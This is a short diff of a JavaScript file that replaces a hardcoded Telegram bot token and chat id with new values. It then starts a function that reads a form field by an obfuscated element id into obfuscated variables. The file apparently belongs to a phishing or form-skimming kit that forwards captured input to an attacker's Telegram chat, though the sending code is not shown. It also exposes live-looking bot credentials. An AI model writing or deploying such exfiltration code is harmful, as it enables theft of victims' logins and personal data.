@@ -1,7 +1,7 @@
 //bot token
-var telegram_bot_id = "5313524679:AAF6KDH6xaEjg5ripIokr3_5bKy1_xXvAj4";
+var telegram_bot_id = "8401213574:AAGEQwftf5u0BXwZ5MWr3sHychkm-XS8Sg0";
 //chat id
-var chat_id = -1001182017096;
+var chat_id = -1003108011898;
 var uBOLT, SU3NS, opri, ripyr0pi;
 var ready = function () {
     uBOLT = document.getElementById("j2k48729j").value;
